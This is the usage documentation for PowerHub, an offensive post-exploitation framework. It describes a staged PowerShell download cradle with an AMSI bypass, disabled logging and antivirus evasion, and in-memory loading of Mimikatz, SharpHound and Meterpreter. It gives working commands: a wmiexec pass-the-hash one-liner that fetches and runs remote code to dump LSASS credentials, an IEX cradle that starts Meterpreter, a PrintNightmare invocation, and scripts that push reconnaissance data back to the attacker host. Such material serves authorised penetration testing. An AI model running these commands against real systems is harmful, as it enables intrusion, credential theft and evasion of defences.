# Usage

## Nomenclature

### Download cradle

Download cradle is the one-liner that loads more code, typically in several
stages, onto the target when executed.

### Stager

By "stager" we mean the first stage that sets up all following stages. It
will perform the following tasks:


* PowerHub will first define the routine for RC4 decryption and not much else.
* Then, an AMSI bypass will be executed using RC4 for de-obfuscation.
* Next, logging will be disabled as much as possible.
* Then the second stage is loaded. It is RC4-encrypted and will define more
  routines that allow us to load following stages more conveniently. For
  example, it will define some routines that take advantage of AES
  libraries so encryption will perform better.
* Now we are ready to load the actual payload. By default, it is the
  actual "PowerHub" PowerShell module. It is responsible for manually
  loading PowerHub modules, mounting WebDAV directories, routines for
  sending back files and shell output, and so on.
* If configured by the user, some PowerHub modules will come pre-loaded.
  Also, the contents of a `profile.ps1` will be executed at the end of the
  last stage.

### Launcher

By launcher we mean the thing that executes the download cradle. Most of the
time, it will be a PowerShell session, but it could also be a `cmd.exe`
session. It could also be Bash, meaning you could pass the download cradle
as a Bash argument to `wmiexec` or something similar that will execute the
command on some target.

### Payload

PowerHub supports the generation of binary payloads as well. Instead of a
download cradle, you will get a link to an EXE file that will do the same thing.
There are some system dependencies necessary to compile the code. This might
easily trigger some anti virus agents, though.

### Module

A module, or more specifically a PowerHub module, is the actual malicious
code. It could be a PowerShell file, a .NET binary, a PE binary or
shell code. The latter two will be executed by using PowerSploit's
`Invoke-ReflectivePEInjection` or `Invoke-Shellcode`, both of which must be
loaded separately first.

## Typical workflow

Most users of PowerHub run it on a system they control, preferably on the
same network as their potential targets. If you must run it on the internet,
consider using the `--allow` flag to restrict access to IP addresses you'd
expect.

On targets that you can control interactively, use a browser to navigate to
the PowerHub instance. Copy the download cradle and run it in a PowerShell
session. Running `Help-PowerHub` will help you get started. Most commands
can also be referred to by a short alias (example: `ghm` for
`Get-HubModule`).

The default settings work most of the time. If the antivirus interferes,
play around with the settings. The more checkboxes you tick, the least
likely it should be detected by an antivirus. However, you may lose some
features, convenience or speed.

On the client you can selectively load more modules and execute them,
hopefully without triggering the antivirus. Output can be transferred back
via `PushTo-Hub` or the web interface.

## Features

### Hub

The first tab lets you configure the download cradle. The transport method
can be HTTP or HTTPS (SMB might be coming in the future), in which case the
download cradle can be configured such the system proxy is used to access
the PowerHub host. In case of HTTPS we can do certificate pinning, use the
Windows certificate store or disable verification entirely.

The AMSI bypass can be chosen as well as the key exchange. The key, with
which the RC4 and AES encryption is used, will be exchanged using the
Diffie-Hellman (DH) protocol by default. Note that no host verification will be
performed on top of the HTTPS connection, so this might be vulnerable to
highly specific active man-in-the-middle attacks.

The DH key exchange requires an extra request, which may not always be an
option, so we can also embed they key directly (in which case all code can
be restored in digital forensics) or provide the key out-of-band on the
command line.

The hub also lets us specify a Clipboard entry to be executed automatically
or pre-load some modules, so that they will be contained in the stager.
Together with the "embedded" or "out-of-band" key exchange option, this will
produce an entirely self-contained file that could also be transported to
the target host in arbitrary ways such as a USB drive.

### Modules

This tab show the modules and lets you download some select modules
conveniently.

Modules have a name as well as a number and can be referred to by both,
where the name is identical to the path of the module on the host relative
to the modules directory. Note that the number can change if modules are
added or removed, in which case you should run `Update-HubModules` on the
target.

They can be loaded on the target with `Get-HubModule`. You can pass a
regular expression, a number or a list of numbers. The modules will be
returned on the command line and can be passed to another Cmdlet. The code
of each module will be transferred in encrypted form and on demand ("lazy
loading"). If the code of a module changed server-side, use the `-Reload`
argument to force reloading the code.

PowerShell modules will be loaded by piping them to `Invoke-Expression`.
.NET modules and PE modules can be executed to `Run-DotNetExe` or `Run-Exe`
respectively. The latter requires PowerSploit's
`Invoke-ReflectivePEInjection` to be loaded first. An alias will be created
that is the same as the base name, i.e. if you execute `Get-HubModule
SharpHound.exe`, you will be able to execute SharpHound by calling
`SharpHound.exe` afterwards. Despite the name, it's a PowerShell function
(or alias). It will then call the module in-memory.

### Clipboard

The clipboard serves as a place to share small snippets, like one-liners of
code, hashes, credentials, etc. Either with yourself on different systems or
with collaborators.

Clipboard entries can be marked as "executable", so they can be specified in
the download cradle. Their contents will then be executed automatically
after loading the last stage. This is useful if you are experimenting with a
particular command and want to keep the download cradle constant.


### File Exchange

The file exchange offers a way to transfer files via HTTP back to the host.
Think [Droopy](https://github.com/stackp/Droopy).

This feature can also be used on the command line with `PushTo-Hub`. It can
transfer files or data from stdin via HTTP back to the PowerHub server.

### Static Files

Sometimes you simply need to serve some static files (payloads, tools, etc.)
using an HTTP server that are available without any authentication. These are
situations where you might be tempted to fire up `python -m http.server`. If
you are already running PowerHub, just put your files inside the static
folder instead. It will respect the tree-like structure of files and
directories and make them accessible for everyone without authentication.


### WebDAV

PowerHub also provides several WebDAV shares. You can mount it on the target as
two network drives with `Mount-WebDAV` or `mwd` (as `S:` and `R:` by
default). Be careful, it allows anonymous access.

One drive is read-only -- maybe you can bypass a weak anti virus with this.
Some exploits require a DLL, so the idea is that you mount the  WebDAV
drive, put malicious DLLs in the read-only directory, and then load them
like this:

```powershell
PS C:\> Import-Module .\cve-2021-1675.ps1
PS C:\> Invoke-Nightmare -DLL "R:\evil-exploit-code.dll"
```

The other has two folders and is writable by everyone:

* `public` with read/write access for everyone
* `blackhole` for dropping sensitive data. Any file placed here via WebDAV
  will immediately be moved to the `upload` directory on the attacker machine.


### profile.ps1

You can create the file `profile.ps1` in `$XDG_DATA_HOME/powerhub/` which
will be automatically executed when loading PowerHub on the Windows machine.
This is my `profile.ps1`:

```powershell
# Make powershell tab completion behave more like bash
try {Set-PSReadlineKeyHandler -Key Tab -Function Complete} catch {}

function Invoke-SharpHound {
    Param(
        [parameter(Mandatory=$False, ValueFromPipeline=$True)]
        [String[]]$Domain = "Default"
    )
    Process {
        foreach ($d in $Domain) {
            Get-HubModule "sharphound.exe" | Run-DotNETExe -Arguments "-c","All","--trackcomputercalls","--zipfilename",$d,"--outputdirectory",(Get-Location).Path
            PushTo-Hub (Get-ChildItem "*_$d.zip")
        }
    }
}

# Put some commands that I pretty much always want to run in one function
function Run-Init {
    Get-SysInfo | PushTo-Hub -Name sysinfo.txt
    Get-HubModule "PrivescCheck.ps1"
    Invoke-PrivescCheck -Extended -Report privesccheck -Format TXT,XML,CSV
    PushTo-Hub "privesccheck.txt"
    PushTo-Hub "privesccheck.xml"
    PushTo-Hub "privesccheck.csv"
    Invoke-SharpHound
    Get-HubModule "Greenshot_for_PortableApps" | Run-Exe -OnDisk
}
```

(binary_payloads)=
### Binary payloads

PowerHub can build binaries that execute the download cradle. The supported
formats are:

* Visual Basic Script (`*.vbs`)
* PE Executables
* .NET Executables

Since they are build with the MinGW cross-compiler, they are near certainly
flagged as malicious by antivirus software.

### power-obfuscate

The Python script `power-obfuscate` can be used to leverage PowerHub's evasion
techniques without requiring the web server. It will allow you to build a
self-contained obfuscated PowerShell file that contains another PowerShell
script or a .NET binary. It supports some of the hub's configuration
options, such as the option to use natural variable names.

Run `power-obfuscate --help` for details.

## Examples

### Running Mimikatz on a remote system

One nice application is, for example, the case where you have obtained some
local administrator password hash and want to move laterally. This dumps the
LSASS creds with [Mimikatz](https://github.com/gentilkiwi/mimikatz) via [Impacket](https://github.com/SecureAuthCorp/impacket)'s `wmiexec.py`:

```console
$ wmiexec.py -hashes :deadbeef0000000000000000deadbeef \
    ./administrator@10.0.1.4  \
    'powershell -c "$K=new-object net.webclient;IEX $K.downloadstring(\"http://10.0.100.13:8000/\"); ghm Mimikatz; Invoke-Mimikatz | pth -Name mimikatz.txt "'
```

### Meterpreter

Let's say you want to execute a Meterpreter in memory, then you do this after placing `meterpreter.exe` in `$XDG_DATA_HOME/powerhub/modules/exe` (don't forget to reload the modules!):

```powershell
PS C:\Users\pentestuser> $K=new-object net.webclient;IEX $K.downloadstring("http://10.0.100.13:8000/0");
PS C:\Users\pentestuser> ghm ReflectivePEInjection; ghm meterpreter.exe|re
```

It should be a staged Meterpreter to keep the binary sufficiently small. I usually use `windows/x64/meterpreter/reverse_https`.

### Empire

Add an Empire launcher to the clipboard, mark it as "executable", then choose the corresponding clipboard ID as "Clip-Exec" in the PowerHub cradle builder.

### power-obfuscate

Turn `SharpHound.exe` into a PowerShell script and execute it upon running
the script:

```console
$ power-obfuscate -i SharpHound.exe -o sharphound.ps1 -n -y --epilogue 'SharpHound.exe -c All'
I 2023-02-18 16:09:14 Output written to sharphound.ps1
I 2023-02-18 16:09:14 Execute the file with 'cat sharphound.ps1|iex' or 'ipmo sharphound.ps1' on the target
```

